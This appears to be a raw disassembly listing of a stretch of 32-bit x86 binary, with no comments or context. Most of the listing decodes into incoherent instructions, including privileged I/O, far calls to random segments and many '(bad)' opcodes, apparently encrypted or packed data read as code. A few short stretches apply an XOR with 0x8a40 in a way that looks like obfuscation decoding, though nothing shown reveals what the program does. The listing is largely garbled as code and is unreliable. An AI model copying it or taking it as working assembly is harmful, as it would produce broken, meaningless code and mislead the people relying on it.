  40300a:	test   DWORD PTR [ebp-0x5ef4765d],0xea5c3f9e
  403014:	ins    DWORD PTR es:[edi],dx
  403015:	sub    BYTE PTR [ebx+0x7150ab16],al
  40301b:	mov    ds:0x924253a4,eax
  403020:	int3   
  403021:	test   ebx,edi
  403023:	mov    edx,0x1f696a4f
  403028:	push   ebp
  403029:	sub    esp,eax
  40302b:	xchg   DWORD PTR [ebx+0x1385e29e],esi
  403031:	ins    DWORD PTR es:[edi],dx
  403032:	cli    
  403033:	pop    ss
  403034:	daa    
  403035:	scas   al,BYTE PTR es:[edi]
  403036:	xchg   edi,eax
  403037:	gs jp  0x403089
  40303a:	imul   ebp,DWORD PTR [ecx],0xffffffa9
  40303d:	xchg   ecx,eax
  40303e:	and    ecx,esi
  403040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403041:	xchg   edi,eax
  403042:	sbb    al,0x6b
  403044:	mov    dh,0x7d
  403046:	ror    BYTE PTR [esi],0xcf
  403049:	sub    edx,DWORD PTR [esi+0x17]
  40304c:	out    0xb0,al
  40304e:	sbb    DWORD PTR [esi+0x417e1d9e],0x89f2de7b
  403058:	call   0x6ae4:0xd3a8e84f
  40305f:	mul    DWORD PTR [esi-0x75]
  403062:	inc    ebp
  403063:	cld    
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	fcmovne st,st(5)
  403076:	xor    ebp,ecx
  403078:	inc    ebp
  403079:	sahf   
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	outs   dx,BYTE PTR ds:[esi]
  403082:	repnz mov al,BYTE PTR [esi-0x38]
  403086:	ret    0x8949
  403089:	out    dx,eax
  40308a:	out    0x76,eax
  40308c:	cmp    ch,BYTE PTR [ecx]
  40308e:	pop    es
  40308f:	push   cs
  403090:	fdivp  st(4),st
  403092:	mov    DWORD PTR [ecx-0x4cba379],ebx
  403098:	pusha  
  403099:	pop    ecx
  40309a:	adc    al,0xa6
  40309c:	adc    BYTE PTR ds:0xcbc3b3ce,dl
  4030a2:	fisubr DWORD PTR [ecx]
  4030a4:	(bad)  
  4030a5:	(bad)  [edx+eax*4]
  4030a8:	out    0xb5,eax
  4030aa:	mov    eax,ds:0x52115156
  4030af:	mov    ebx,ecx
  4030b1:	stc    
  4030b2:	shl    DWORD PTR [edi-0x6d],1
  4030b5:	mov    dl,0xa4
  4030b7:	loopne 0x4030c6
  4030b9:	cmp    ebx,DWORD PTR [ecx-0x6f]
  4030bc:	repz or eax,0xd912db3d
  4030c2:	lods   al,BYTE PTR ds:[esi]
  4030c3:	inc    eax
  4030c4:	jmp    0x4d5d:0x63c79f37
  4030cb:	pop    esi
  4030cc:	mov    al,ds:0x7b9f0adf
  4030d1:	repz push ss
  4030d3:	rol    BYTE PTR [esi-0x45],1
  4030d6:	dec    edi
  4030d7:	stos   DWORD PTR es:[edi],eax
  4030d8:	imul   ebp,DWORD PTR [ecx-0x675fad77],0x91a2e7ba
  4030e2:	retf   
  4030e3:	mov    al,0x62
  4030e5:	and    DWORD PTR ds:0x4cfa3d1a,ebp
  4030eb:	in     eax,0xba
  4030ed:	jno    0x40315c
  4030ef:	icebp  
  4030f0:	sub    eax,0x3b40f7a7
  4030f5:	dec    edx
  4030f6:	inc    ecx
  4030f7:	scas   al,BYTE PTR es:[edi]
  4030f8:	test   eax,0xa37b3f94
  4030fd:	pusha  
  4030fe:	and    al,0x8f
  403100:	inc    eax
  403101:	jmp    0x403114
  403103:	dec    ecx
  403104:	stc    
  403105:	addr16 mov ch,cl
  403108:	test   eax,0x26ad9806
  40310d:	cs lahf 
  40310f:	outs   dx,BYTE PTR ds:[esi]
  403110:	sub    eax,DWORD PTR [ebx+0x7a7af07d]
  403116:	les    esi,FWORD PTR [edx-0x525d3a10]
  40311c:	jbe    0x403175
  40311e:	mov    bh,0xe0
  403120:	js     0x403189
  403122:	xchg   edx,eax
  403123:	rol    ebp,cl
  403125:	sahf   
  403126:	add    eax,0x77faa1d7
  40312b:	cli    
  40312c:	in     eax,0xaf
  40312e:	xlat   BYTE PTR ds:[ebx]
  40312f:	int    0x5f
  403131:	mov    ch,0xcc
  403133:	dec    esp
  403134:	popf   
  403135:	push   ebp
  403136:	dec    ecx
  403137:	pop    edi
  403138:	out    0xf2,eax
  40313a:	mov    eax,ds:0x446ef814
  40313f:	imul   ecx,esp,0xe10a51a
  403145:	and    BYTE PTR [ecx+0x724e4f42],ah
  40314b:	dec    edi
  40314c:	push   esi
  40314d:	inc    esi
  40314e:	rcr    DWORD PTR [eax+0xc],0x34
  403152:	stc    
  403153:	push   cs
  403154:	mov    edi,0x6285bfb6
  403159:	mov    bh,0xd5
  40315b:	xor    DWORD PTR [edx-0x5ba8f1ad],0x23811c9e
  403165:	push   edx
  403166:	popa   
  403167:	xor    BYTE PTR [ebx-0x6db5608b],bl
  40316d:	jns    0x40312c
  40316f:	and    BYTE PTR [ebx],bh
  403171:	mov    dh,0xca
  403173:	fild   QWORD PTR [esi+0x5d4a0f12]
  403179:	cdq    
  40317a:	jle    0x4031a4
  40317c:	xchg   ecx,eax
  40317d:	mov    eax,gs
  40317f:	mov    al,ds:0x85f05a0
  403184:	jp     0x4031fb
  403186:	test   eax,0xe8a357e7
  40318b:	(bad)  
  40318d:	mov    ds:0x4cd491e,eax
  403192:	xadd   DWORD PTR [edi],edi
  403195:	jecxz  0x40317e
  403197:	stos   DWORD PTR es:[edi],eax
  403198:	or     al,0x78
  40319a:	out    0xaa,eax
  40319c:	mov    eax,0xb50bdcc5
  4031a1:	out    0xdd,eax
  4031a3:	nop
  4031a4:	jp     0x40312e
  4031a6:	pop    edi
  4031a7:	fst    QWORD PTR [esi+0x5caecc43]
  4031ad:	pop    ebx
  4031ae:	pop    ebp
  4031af:	add    cl,BYTE PTR [ecx+ebp*4+0x25]
  4031b3:	inc    ebx
  4031b4:	mov    eax,ds:0xcd3ea40c
  4031b9:	jg     0x403212
  4031bb:	jp     0x403198
  4031bd:	dec    esi
  4031be:	add    al,BYTE PTR [esi+0x0]
  4031c1:	push   eax
  4031c2:	fcmovb st,st(4)
  4031c4:	lahf   
  4031c5:	test   al,0x6d
  4031c7:	mov    DWORD PTR [esi],edx
  4031c9:	jge    0x403240
  4031cb:	scas   eax,DWORD PTR es:[edi]
  4031cc:	aad    0xd8
  4031ce:	add    al,0x10
  4031d0:	xor    ebp,DWORD PTR [ecx+0x13]
  4031d3:	cmp    al,0x2e
  4031d5:	test   eax,0x94239614
  4031da:	sahf   
  4031db:	mov    ecx,0x4bf38313
  4031e0:	(bad)  
  4031e1:	ins    BYTE PTR es:[edi],dx
  4031e2:	loop   0x4031cd
  4031e4:	add    BYTE PTR [ebx-0x46],ch
  4031e7:	(bad)  
  4031e8:	retf   0x1957
  4031eb:	popa   
  4031ec:	scas   al,BYTE PTR es:[edi]
  4031ed:	loopne 0x4031a5
  4031ef:	call   0xddda8b5d
  4031f4:	in     eax,dx
  4031f5:	mov    dl,0xc6
  4031f7:	imul   ecx,DWORD PTR [edi-0x10],0x2
  4031fb:	dec    ebx
  4031fc:	repz dec esp
  4031fe:	shl    BYTE PTR [esi+0x3e1bbdc7],cl
  403204:	pop    ds
  403205:	mov    dl,0x34
  403207:	idiv   DWORD PTR [eax+0x56]
  40320a:	test   BYTE PTR [edx+esi*2+0x2b],ah
  40320e:	daa    
  40320f:	or     BYTE PTR [edi-0x4d],bh
  403212:	xchg   DWORD PTR [edi+0x4fd605bf],edi
  403218:	arpl   WORD PTR [edi-0x1c],si
  40321b:	imul   edi,esi,0x1f
  40321e:	inc    eax
  40321f:	popf   
  403220:	xchg   ecx,eax
  403221:	push   eax
  403222:	lock jne 0x403252
  403225:	inc    eax
  403226:	dec    esi
  403227:	sub    BYTE PTR [edx],0xb9
  40322a:	fidiv  DWORD PTR [ebp-0x1cfcef25]
  403230:	xchg   DWORD PTR [ebp-0x11684650],ebx
  403236:	div    BYTE PTR [esi+0x4c0906d0]
  40323c:	adc    DWORD PTR [ebp-0x224aed7],edx
  403242:	dec    edx
  403243:	out    dx,eax
  403244:	xchg   esp,eax
  403245:	test   al,0x88
  403247:	sbb    al,0xe2
  403249:	mov    esi,0x483cc57a
  40324e:	scas   al,BYTE PTR es:[edi]
  40324f:	and    cl,BYTE PTR [ecx+0x706f85bf]
  403255:	inc    esi
  403256:	and    dh,BYTE PTR [edx+0x5eba10b1]
  40325c:	mov    al,ds:0xb773e54a
  403261:	sub    DWORD PTR ds:0xe3185304,eax
  403267:	push   edx
  403268:	cmp    al,BYTE PTR [ebx+0x10eb2f55]
  40326e:	mov    ebx,0x29971ae5
  403273:	je     0x403275
  403275:	and    dl,0x53
  403278:	addr16 jno 0x403276
  40327b:	jl     0x4032e4
  40327d:	fisub  DWORD PTR [ecx+ebx*8]
  403280:	ror    edx,0xb6
  403283:	add    BYTE PTR [edx-0x4374cf6b],ch
  403289:	(bad)  
  40328a:	call   0x9945:0xae0d89bd
  403291:	sahf   
  403292:	xchg   DWORD PTR [ecx+0x713126ea],eax
  403298:	in     al,0x37
  40329a:	adc    dh,cl
  40329c:	mov    ds:0x8f2292f5,eax
  4032a1:	add    dh,BYTE PTR [edx+0x698ab8f]
  4032a7:	ret    
  4032a8:	inc    edi
  4032a9:	pop    ss
  4032aa:	sti    
  4032ab:	cmp    DWORD PTR [esi+ebp*2+0x273e1a57],ebp
  4032b2:	pop    es
  4032b3:	push   ecx
  4032b4:	pop    es
  4032b5:	enter  0x9712,0x90
  4032b9:	mov    ecx,0xf1d28299
  4032be:	int    0x10
  4032c0:	jge    0x403317
  4032c2:	inc    esp
  4032c3:	push   edi
  4032c4:	sbb    esp,esi
  4032c6:	int3   
  4032c7:	mov    ecx,0xd373513c
  4032cc:	std    
  4032cd:	js     0x4032da
  4032cf:	pop    ds
  4032d0:	(bad)  
  4032d1:	dec    ecx
  4032d2:	mov    eax,ds:0x303e5f3
  4032d7:	sti    
  4032d8:	adc    BYTE PTR [edx+0xce9182d],al
  4032de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032df:	jno    0x403339
  4032e1:	rcr    BYTE PTR [ecx+0x79935f27],0x6b
  4032e8:	addr16 popa 
  4032ea:	xchg   ebx,eax
  4032eb:	push   ebp
  4032ec:	cld    
  4032ed:	dec    esp
  4032ee:	adc    ebp,DWORD PTR fs:[edx-0x2a]
  4032f2:	addr16 inc di
  4032f5:	push   edi
  4032f6:	stos   DWORD PTR es:[edi],eax
  4032f7:	shl    DWORD PTR [eax+0x55],0x1e
  4032fb:	or     esp,DWORD PTR [edx+eiz*4+0x381a07e9]
  403302:	or     eax,0xb4298afd
  403307:	jae    0x403300
  403309:	clc    
  40330a:	sbb    dh,BYTE PTR [esp+esi*4]
  40330d:	inc    edi
  40330e:	xor    BYTE PTR [ebx],al
  403310:	fnstcw WORD PTR [ebx+0x452c1664]
  403316:	out    0x0,eax
  403318:	cmp    ebp,eax
  40331a:	inc    ebx
  40331b:	fisttp WORD PTR [edx+0x5df1d914]
  403321:	js     0x4032d0
  403323:	popf   
  403324:	ret    
  403325:	or     eax,0x5da68fb9
  40332a:	pop    ebx
  40332b:	hlt    
  40332c:	sti    
  40332d:	(bad)  
  40332f:	mov    edx,0xc5615216
  403334:	dec    ebp
  403335:	mov    eax,ds:0x68eed83b
  40333a:	jle    0x4032cf
  40333c:	or     edx,ebx
  40333e:	inc    ebp
  40333f:	jl     0x40332c
  403341:	mov    cl,0x49
  403343:	lods   eax,DWORD PTR ds:[esi]
  403344:	lods   al,BYTE PTR ds:[esi]
  403345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403346:	loope  0x403357
  403348:	sub    DWORD PTR [esp+ecx*2+0x5cb396b8],edx
  40334f:	push   DWORD PTR [esi+eiz*1+0x20]
  403353:	jle    0x403352
  403355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403356:	dec    edx
  403357:	cmc    
  403358:	push   0xdaae4657
  40335d:	mov    cl,0x38
  40335f:	fninit 
  403361:	sub    ch,BYTE PTR [eax+0x3164ab23]
  403367:	ja     0x403321
  403369:	inc    edi
  40336a:	pusha  
  40336b:	out    dx,eax
  40336c:	js     0x40335b
  40336e:	adc    cl,0x1e
  403371:	inc    esi
  403372:	cmp    al,BYTE PTR ds:0x7bd7b5a0
  403378:	xchg   esi,eax
  403379:	test   al,0x98
  40337b:	mov    bl,0xe0
  40337d:	xrelease mov BYTE PTR [ecx],dh
  403380:	dec    ebp
  403381:	pushf  
  403382:	lods   eax,DWORD PTR ds:[esi]
  403383:	pop    edi
  403384:	and    BYTE PTR [esi],bh
  403386:	rcr    DWORD PTR [edi+esi*8-0x4636d6ff],1
  40338d:	or     DWORD PTR [ecx-0x6e],ecx
  403390:	out    dx,eax
  403391:	jle    0x403379
  403393:	mov    ah,0xcf
  403395:	dec    eax
  403396:	jg     0x403366
  403398:	inc    ebp
  403399:	out    dx,eax
  40339a:	mov    ebp,0x5f7c73ca
  40339f:	fdivr  QWORD PTR [edi+0x12]
  4033a2:	mov    ebx,0x5a9f74f
  4033a7:	aad    0xb0
  4033a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033aa:	xor    ah,BYTE PTR [ebp-0x68422385]
  4033b0:	add    cl,al
  4033b2:	mov    ds:0xd5d3759,eax
  4033b7:	xchg   ebx,eax
  4033b9:	ss pop ebp
  4033bb:	mov    ecx,0xcd1f4801
  4033c0:	xor    BYTE PTR [ebx-0x6830466c],ch
  4033c6:	test   eax,0x7be27b0c
  4033cb:	xor    al,0x13
  4033cd:	pusha  
  4033ce:	xchg   ecx,eax
  4033cf:	mov    ah,0x9
  4033d1:	cmc    
  4033d2:	or     al,0x3b
  4033d4:	jae    0x403449
  4033d6:	or     al,0x94
  4033d8:	clc    
  4033d9:	test   BYTE PTR [esi+0x29],bl
  4033dc:	fbld   TBYTE PTR [eax+0x3b4e4f28]
  4033e2:	loop   0x40342a
  4033e4:	cmp    eax,0xe7f08f03
  4033e9:	inc    ebx
  4033ea:	xchg   BYTE PTR [ebp+0x530f434a],dh
  4033f0:	or     al,0x1e
  4033f2:	push   eax
  4033f3:	push   0x1e7c1bbb
  4033f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033f9:	call   0x7fc36e8e
  4033fe:	faddp  st(0),st
  403400:	in     al,0x36
  403402:	jb     0x4033c6
  403404:	outs   dx,DWORD PTR ds:[esi]
  403405:	aaa    
  403406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403407:	jae    0x40338f
  403409:	pop    esp
  40340a:	test   ah,cl
  40340c:	in     eax,0x52
  40340e:	cmp    DWORD PTR [edx-0x2faf174f],eax
  403414:	lods   al,BYTE PTR ds:[esi]
  403415:	mov    edi,DWORD PTR [ebp+0x8]
  403418:	mov    edi,DWORD PTR [edi]
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	icebp  
  403434:	stos   BYTE PTR es:[edi],al
  403435:	dec    ecx
  403436:	(bad)  [edx]
  403438:	push   ds
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	popf   
  403440:	jl     0x4034a8
  403442:	add    DWORD PTR [esi],ebp
  403444:	daa    
  403445:	dec    ebx
  403446:	call   0xe7c91c88
  40344b:	pop    edi
  40344c:	imul   esp,DWORD PTR [ebx+0x76256201],0x21
  403453:	mov    ds:0x14abb43e,al
  403458:	jmp    0x9d06dbcd
  40345d:	adc    eax,0xdd93572d
  403462:	int    0x7f
  403464:	push   eax
  403465:	shl    esp,1
  403467:	cmp    eax,eax
  403469:	fstp   DWORD PTR [eax]
  40346b:	pop    edx
  40346c:	adc    bl,dh
  40346e:	or     eax,0xc284ea36
  403473:	addr16 in eax,dx
  403475:	pop    ecx
  403476:	mov    ah,BYTE PTR [edi+esi*8+0x33]
  40347a:	lods   eax,DWORD PTR ds:[esi]
  40347b:	add    eax,0x3278df22
  403480:	adc    DWORD PTR [ecx-0x8],0xffffffdc
  403484:	sti    
  403485:	ins    DWORD PTR es:[edi],dx
  403486:	mov    ebp,0xc0eb0fc
  40348b:	sti    
  40348c:	xor    bh,BYTE PTR [eax-0x40cffa8a]
  403492:	mov    ds:0x5937ec5b,al
  403497:	push   es
  403498:	(bad)  
  403499:	jne    0x40350c
  40349b:	outs   dx,DWORD PTR ds:[esi]
  40349c:	push   es
  40349d:	mov    ds:0x5ea2c28d,eax
  4034a2:	hlt    
  4034a3:	mov    esi,0xac94c011
  4034a8:	(bad)  
  4034a9:	js     0x4034f4
  4034ab:	pop    edi
  4034ac:	mov    edx,0xbc66fb3f
  4034b1:	(bad)  
  4034b2:	mov    edx,0x250c740a
  4034b7:	shr    DWORD PTR [eax],1
  4034b9:	inc    esp
  4034ba:	dec    edx
  4034bb:	fdivr  DWORD PTR [eax+eax*8+0x35]
  4034bf:	inc    esp
  4034c0:	pop    ebx
  4034c1:	ja     0x403449
  4034c3:	or     al,0x76
  4034c5:	push   ebx
  4034c6:	mov    edi,0x91b19831
  4034cb:	fwait
  4034cc:	xchg   BYTE PTR [ebx],ch
  4034ce:	call   0x2185:0x9d38002d
  4034d5:	out    0x4,eax
  4034d7:	lods   eax,DWORD PTR ds:[esi]
  4034d8:	popa   
  4034d9:	mov    esp,DWORD PTR [ebx-0x38e172bd]
  4034df:	fs std 
  4034e1:	jae    0x4034bb
  4034e3:	mov    ebx,fs
  4034e5:	inc    edi
  4034e6:	push   es
  4034e7:	pusha  
  4034e8:	mov    ch,0x13
  4034ea:	add    eax,0xb7c5901c
  4034ef:	push   ds
  4034f0:	push   es
  4034f1:	jo     0x4034b1
  4034f3:	xchg   DWORD PTR [edx],ebp
  4034f5:	sub    eax,0x1bd7e8c8
  4034fa:	mov    ecx,0x484f74b
  4034ff:	je     0x4034ce
  403501:	loop   0x40353b
  403503:	daa    
  403504:	dec    ebx
  403505:	inc    edx
  403506:	pop    eax
  403507:	je     0x40352f
  403509:	(bad)  
  40350a:	loopne 0x40354a
  40350c:	add    BYTE PTR [eax],dl
  40350e:	in     al,dx
  40350f:	fnstcw WORD PTR [edi]
  403511:	in     al,0x67
  403513:	test   eax,0x7ccd8600
  403518:	adc    DWORD PTR [ecx+0x3a7b5194],eax
  40351e:	das    
  40351f:	mov    cs,WORD PTR [eax*2-0xb281a5a]
  403526:	icebp  
  403527:	loopne 0x4034db
  403529:	test   DWORD PTR [ebp-0x3c],ebp
  40352c:	fild   QWORD PTR [edx-0x6b81593f]
  403532:	pop    edx
  403533:	and    ah,BYTE PTR [ebx+ecx*1-0x7d]
  403537:	push   eax
  403538:	shr    DWORD PTR [ecx-0x57],1
  40353b:	push   eax
  40353c:	retf   0xeae5
  40353f:	sbb    eax,0x37adcc9c
  403544:	sub    ah,BYTE PTR [ebx+ebp*2-0x12]
  403548:	dec    ecx
  403549:	push   cs
  40354a:	loop   0x403518
  40354c:	sahf   
  40354d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40354e:	pop    es
  40354f:	mov    dl,BYTE PTR [ecx+0x3c]
  403552:	jp     0x403533
  403554:	dec    edx
  403555:	jge    0x4035cf
  403557:	push   0xd4eb9d12
  40355c:	pushf  
  40355d:	sub    ecx,ebx
  40355f:	dec    ebp
  403560:	adc    eax,0x97afdae8
  403565:	dec    esp
  403566:	in     eax,dx
  403567:	push   edx
  403568:	mov    eax,0x869d3ade
  40356d:	mov    eax,0x685c1408
  403572:	lock retf 
  403574:	push   0x24
  403576:	push   ebp
  403577:	test   DWORD PTR [edx],ecx
  403579:	xchg   esi,eax
  40357a:	fisub  DWORD PTR [edi]
  40357c:	aas    
  40357d:	int    0x58
  40357f:	jge    0x403528
  403581:	mov    eax,ds:0x2ea78a18
  403586:	sub    ecx,edx
  403588:	std    
  403589:	pop    ss
  40358a:	lock xchg edi,eax
  40358c:	sub    al,0xc0
  40358e:	dec    esi
  40358f:	mov    edi,0xc1f7ba3e
  403594:	jp     0x403611
  403596:	xchg   ebx,ebx
  403598:	(bad)  
  403599:	jg     0x403548
  40359b:	fs (bad) 
  40359d:	lock mov ch,0x87
  4035a0:	jae    0x4035f7
  4035a2:	dec    ebp
  4035a3:	cmovns esp,DWORD PTR [edi-0x4b10ffbb]
  4035aa:	adc    BYTE PTR [ebx],0x15
  4035ad:	mov    ah,0xee
  4035af:	outs   dx,BYTE PTR ds:[esi]
  4035b0:	adc    DWORD PTR [esi+0x4],ecx
  4035b3:	aam    0xe4
  4035b5:	inc    edx
  4035b6:	jns    0x403633
  4035b8:	icebp  
  4035b9:	bound  edi,QWORD PTR [edi-0x55]
  4035bc:	popf   
  4035bd:	pop    ds
  4035be:	pop    esi
  4035bf:	sub    dl,BYTE PTR [edx+0x1b353778]
  4035c5:	or     al,BYTE PTR [edi]
  4035c7:	xchg   esp,eax
  4035c8:	cld    
  4035c9:	(bad)  
  4035ca:	(bad)  [edx]
  4035cc:	mov    es,edi
  4035ce:	pushf  
  4035cf:	ins    DWORD PTR es:[edi],dx
  4035d0:	adc    BYTE PTR [ecx],cl
  4035d2:	stos   BYTE PTR es:[edi],al
  4035d3:	xchg   esp,eax
  4035d4:	pusha  
  4035d5:	mov    bl,0xa6
  4035d7:	ret    
  4035d8:	jnp    0x4035b9
  4035da:	add    al,BYTE PTR [ebx+0x8073cf]
  4035e0:	cmp    DWORD PTR [ecx+eax*8-0x16],0xffffffd8
  4035e5:	int3   
  4035e6:	add    BYTE PTR [esi],bl
  4035e8:	mov    bl,0x80
  4035ea:	mov    ebx,0xa2d19255
  4035ef:	test   BYTE PTR [ecx-0x73],ah
  4035f2:	sahf   
  4035f3:	retf   0xba51
  4035f6:	lea    ecx,ds:0x336a75fc
  4035fc:	shl    ebp,0x10
  4035ff:	or     BYTE PTR [ebx+0x1b256e3e],cl
  403605:	cs sub dl,ah
  403608:	scas   eax,DWORD PTR es:[edi]
  403609:	clc    
  40360a:	fsubr  st,st(7)
  40360c:	pushf  
  40360d:	pop    es
  40360e:	imul   ebx,DWORD PTR [edx],0x42
  403611:	push   ecx
  403612:	mov    dh,0x31
  403614:	leave  
  403615:	cs mov eax,0xb4d4c99e
  40361b:	or     al,0x6a
  40361d:	(bad)
  403620:	int    0xa
  403622:	sahf   
  403623:	out    0xc3,eax
  403625:	aad    0xb4
  403627:	pop    edx
  403628:	cwde   
  403629:	out    dx,eax
  40362a:	mov    al,ds:0xd791e8b2
  40362f:	push   eax
  403630:	mov    dh,0x17
  403632:	dec    esi
  403633:	in     eax,0xfe
  403635:	pop    edi
  403636:	in     eax,0x8b
  403638:	outs   dx,DWORD PTR ds:[esi]
  403639:	mov    bh,0x2
  40363b:	fst    DWORD PTR [edi-0x7187435c]
  403641:	ins    DWORD PTR es:[edi],dx
  403642:	push   edi
  403643:	cmp    al,0x74
  403645:	cmp    ebx,DWORD PTR [esp+edx*4-0x2]
  403649:	mov    al,0xd1
  40364b:	adc    al,al
  40364d:	inc    eax
  40364e:	inc    edx
  40364f:	shr    DWORD PTR [eax+0x24],1
  403652:	mov    bh,0xbe
  403654:	fldenv [ecx-0x248412e3]
  40365a:	push   eax
  40365b:	cmp    DWORD PTR [eax+0x37c1dcd8],esp
  403661:	mov    ebx,0xf873c6f9
  403666:	test   DWORD PTR [ebp-0x79],esp
  403669:	cdq    
  40366a:	mov    cl,0x87
  40366c:	sbb    esi,DWORD PTR [ebx+edi*2+0x705ea576]
  403673:	pushf  
  403674:	cwde   
  403675:	xchg   ecx,eax
  403676:	mov    edx,0x84730b0a
  40367b:	push   cs
  40367c:	jecxz  0x4036ba
  40367e:	mov    ds:0xce9a2a6e,al
  403683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403684:	fwait
  403685:	dec    eax
  403686:	sub    ebp,DWORD PTR ds:[edi]
  403689:	xor    al,0x5e
  40368b:	xchg   esp,eax
  40368c:	xchg   edx,eax
  40368d:	mov    bh,0x4a
  40368f:	(bad)  
  403690:	repz cld 
  403692:	sahf   
  403693:	mov    bl,0xa3
  403695:	(bad)  
  403696:	pop    edx
  403697:	pop    ds
  403698:	xor    ah,bl
  40369a:	call   0xe697:0x6bda8e87
  4036a1:	(bad)  
  4036a2:	lock adc ecx,esi
  4036a5:	sbb    BYTE PTR [edi],cl
  4036a7:	adc    DWORD PTR [ecx-0x49879167],ebp
  4036ad:	cmc    
  4036ae:	das    
  4036af:	pop    edx
  4036b0:	sar    DWORD PTR [esi-0x197ceb7a],cl
  4036b6:	inc    ebp
  4036b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036b8:	mov    eax,fs
  4036ba:	int3   
  4036bb:	xor    edx,DWORD PTR [edx]
  4036bd:	jns    0x403727
  4036bf:	sub    ebx,eax
  4036c1:	xchg   bp,ax
  4036c3:	dec    ebp
  4036c4:	push   0xffffffd2
  4036c6:	jp     0x403723
  4036c8:	lahf   
  4036c9:	fisttp DWORD PTR [eax+eax*8]
  4036cc:	mov    ah,0x4b
  4036ce:	mov    ebp,0xc65c5355
  4036d3:	mov    edi,0xd97ed73f
  4036d8:	aaa    
  4036d9:	loopne 0x403745
  4036db:	xchg   esi,eax
  4036dc:	xchg   ebp,eax
  4036dd:	(bad)  
  4036de:	lods   al,BYTE PTR ds:[esi]
  4036df:	xchg   esp,eax
  4036e0:	(bad)  
  4036e1:	pop    ebx
  4036e2:	jecxz  0x4036ec
  4036e4:	sti    
  4036e5:	lgs    eax,FWORD PTR [edi+0x7cfc20bc]
  4036ec:	pop    eax
  4036ed:	mov    esp,es
  4036ef:	pop    eax
  4036f0:	(bad)  
  4036f1:	fsub   QWORD PTR ds:0xd7b42e10
  4036f7:	ins    BYTE PTR es:[edi],dx
  4036f8:	pop    eax
  4036f9:	cmp    dl,0x43
  4036fc:	adc    al,0xbe
  4036fe:	cwde   
  4036ff:	cmp    eax,0x82ee3ef8
  403704:	das    
  403705:	test   dh,ch
  403707:	ins    DWORD PTR es:[edi],dx
  403708:	je     0x4036cb
  40370a:	lea    esi,[esi]
  40370c:	into   
  40370d:	ss dec ecx
  40370f:	push   edx
  403710:	or     BYTE PTR [edi+edx*8-0x302e205c],al
  403717:	push   esp
  403718:	sub    DWORD PTR [edx-0x4],edx
  40371b:	adc    DWORD PTR [ebx-0x753329b8],0xcdfe0c70
  403725:	aas    
  403726:	and    al,0x25
  403728:	les    esp,FWORD PTR [eax]
  40372a:	daa    
  40372b:	jp     0x4036d8
  40372d:	mov    bh,0xf0
  40372f:	mov    es,WORD PTR [edx]
  403731:	sbb    bl,dh
  403733:	inc    ebx
  403734:	mov    dh,0xd0
  403736:	test   al,0x5c
  403738:	xor    al,0x42
  40373a:	adc    cl,bh
  40373c:	(bad)  
  40373d:	mov    ebp,0x6208da51
  403742:	mov    eax,ecx
  403744:	inc    eax
  403745:	faddp  st(3),st
  403747:	sbb    al,0xe2
  403749:	mov    eax,0x22a96b6f
  40374e:	cmp    DWORD PTR [ecx+eax*2+0x8289477],ecx
  403755:	icebp  
  403756:	adc    BYTE PTR [ebx+eiz*1+0x76],al
  40375a:	aaa    
  40375b:	popa   
  40375c:	xor    dh,0x21
  40375f:	retf   0xce76
  403762:	or     BYTE PTR [edx+0x77],dl
  403765:	aas    
  403766:	add    eax,DWORD PTR ds:[edx-0x3e77af05]
  40376d:	retf   
  40376e:	idiv   DWORD PTR [esi]
  403770:	and    eax,0x8df0c94c
  403775:	and    BYTE PTR [ebp-0x2a02b7cc],al
  40377b:	cdq    
  40377c:	in     al,dx
  40377d:	xchg   esp,eax
  40377e:	inc    edi
  40377f:	sbb    al,0xac
  403781:	fidivr DWORD PTR [ebp*1+0x32648a79]
  403788:	pop    ebx
  403789:	mov    ebx,0x8d2f0d62
  40378e:	cld    
  40378f:	and    DWORD PTR [ebx-0x128f318b],0x9cce3886
  403799:	adc    ebp,esi
  40379b:	jmp    DWORD PTR [ebp+0x3c417059]
  4037a1:	ds test eax,0xa184ebdc
  4037a7:	jo     0x4037f3
  4037a9:	xor    BYTE PTR [eax+0x483243b6],bh
  4037af:	xchg   esp,eax
  4037b0:	dec    edx
  4037b1:	push   es
  4037b2:	sub    esi,ecx
  4037b4:	pop    eax
  4037b5:	pop    esi
  4037b6:	mov    ds:0x39a7280b,eax
  4037bb:	xchg   esp,eax
  4037bc:	inc    edx
  4037bd:	sbb    eax,0x60297733
  4037c2:	sbb    al,0x8e
  4037c4:	cwde   
  4037c5:	jns    0x4037b9
  4037c7:	fcom   QWORD PTR [eax+0x76]
  4037ca:	enter  0xd2b,0xa5
  4037ce:	jp     0x4037fa
  4037d0:	rcr    BYTE PTR [ebx+0x3b06ba63],0x0
  4037d7:	add    BYTE PTR [esi+0x3],ah
  4037da:	ret    0x3b66
  4037dd:	pop    es
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
